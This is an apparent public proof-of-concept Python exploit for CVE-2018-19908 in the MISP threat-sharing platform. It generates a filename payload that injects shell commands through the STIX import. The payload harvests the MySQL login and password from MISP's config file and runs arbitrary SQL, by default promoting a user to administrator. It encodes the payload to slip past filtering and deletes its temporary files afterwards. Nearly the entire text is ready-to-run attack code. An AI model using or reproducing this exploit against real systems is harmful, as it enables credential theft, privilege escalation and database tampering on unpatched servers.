#
# Exploit Title: SQL command execution via command injection in STIX module
# Exploit Author: Tm9jdGlz
# Vendor Homepage: https://www.misp-project.org/
# Software link: https://www.misp-project.org/download/
# Version: 2.4.90 - 2.4.99
# Tested on: 2.4.97
# CVE: CVE-2018-19908
# 
# Use this payload as stix filename

def encode_data(data):
    from base64 import b64encode
    from urllib.parse import quote_plus

    b64Data = b64encode(data.encode("utf-8"))
    urlEncode = quote_plus(b64Data)

    return urlEncode


def generate_payload(SQLRequest):
    payload = &#039;MISPPath="../../";&#039;\
            &#039;MISPPDB="$MISPPath/app/Config/database.php";&#039;\
            &#039;MySQLUUser=$(grep -o -P "(?<=\&#039;login\&#039; => \&#039;).*(?=\&#039;)" $MISPPDB);&#039;\
            &#039;MySQLRUser=${{MySQLRUser:-$MySQLUUser}};&#039;\
            &#039;MySQLUPass=$(grep -o -P "(?<=\&#039;password\&#039; => \&#039;).*(?=\&#039;)" $MISPPDB);&#039;\
            &#039;MySQLRPass=${{MySQLRPass:-$MySQLUPass}};&#039;\
            &#039;MISPDB=$(grep -o -P "(?<=\&#039;database\&#039; => \&#039;).*(?=\&#039;)" $MISPPDB);&#039;\
            &#039;mysql -u $MySQLRUser -p$MySQLRPass $MISPDB -e "{}"&#039;
    return payload.format(SQLRequest)

def generate_exploit(SQLRequest, **kwargs):
    options = {
            "inputFile" : kwargs.get("input_file", "data"),
            "outputFile" : kwargs.get("output_file", "data2"),
            "payload" : encode_data(generate_payload(SQLRequest))
    }

    exploit = "; echo &#039;{payload}&#039;>{inputFile};"\
            "python3 -c &#039;import urllib.parse;"\
            &#039;fd=open(\\"{outputFile}\\",\\"w\\");&#039;\
            &#039;fd.write(urllib.parse.unquote_plus(open(\\"{inputFile}\\").read()));&#039;\
            "fd.close()&#039;;"\
            "base64 -d {outputFile}>{inputFile};"\
            "sh {inputFile};"\
            "rm {inputFile} {outputFile} #".format(**options)
    return exploit

def main():
    SQLRequest = "UPDATE users SET role_id=1 WHERE id = 2"
    print(generate_exploit(SQLRequest))

if __name__ == "__main__":
    main()

